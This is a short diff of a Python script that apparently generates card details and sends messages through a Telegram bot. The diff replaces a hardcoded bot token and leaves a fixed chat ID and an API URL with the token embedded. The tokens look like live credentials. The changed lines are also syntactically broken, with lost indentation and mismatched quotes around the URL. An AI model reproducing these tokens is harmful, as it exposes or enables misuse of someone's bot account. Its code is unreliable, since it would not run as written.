@@ -88,9 +88,9 @@ def generate_card_details():
 
 def send_messages():
     # Bot configuration
-bot_token = "8839085501:AAEXfJOfhyrpJZJsf_36Ybf8_ecNFdiYv8c"
+bot_token = "8839085501:AAFzeLZFnEjNNIvBjNG5VwHcWO7pJ6BSQxY"
 chat_id = 5054907656
-telegram_api = f"https://api.telegram.org/8839085501:AAEXfJOfhyrpJZJsf_36Ybf8_ecNFdiYv8c
+telegram_api = f"https://api.telegram.org/"8839085501:AAFzeLZFnEjNNIvBjNG5VwHcWO7pJ6BSQxY"
     # Configuration
     requests_limit = 1
     pause_duration = 3
